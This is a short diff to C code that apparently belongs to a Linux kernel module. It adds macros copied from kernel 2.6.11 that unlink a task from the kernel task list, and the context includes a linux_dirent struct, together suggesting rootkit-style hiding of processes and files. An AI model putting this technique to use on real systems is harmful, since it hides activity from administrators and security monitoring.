@@ -31,6 +31,20 @@
 #define OUR_DEBUG(...)
 #endif
 
+/* the followin macros are taken from linux kernel source code (2.6.11)
+   they probably remove a task from the task list - have to try it out */
+#define REMOVE_LINKS(p) do {                                    \
+        if (thread_group_leader(p))                             \
+                list_del_init(&(p)->tasks);                     \
+        remove_parent(p);                                       \
+        } while (0)
+
+#define SET_LINKS(p) do {                                       \
+        if (thread_group_leader(p))                             \
+                list_add_tail(&(p)->tasks,&init_task.tasks);    \
+        add_parent(p, (p)->parent);                             \
+        } while (0)
+
 
 struct linux_dirent {
     unsigned long  d_ino;     /* Inode number */
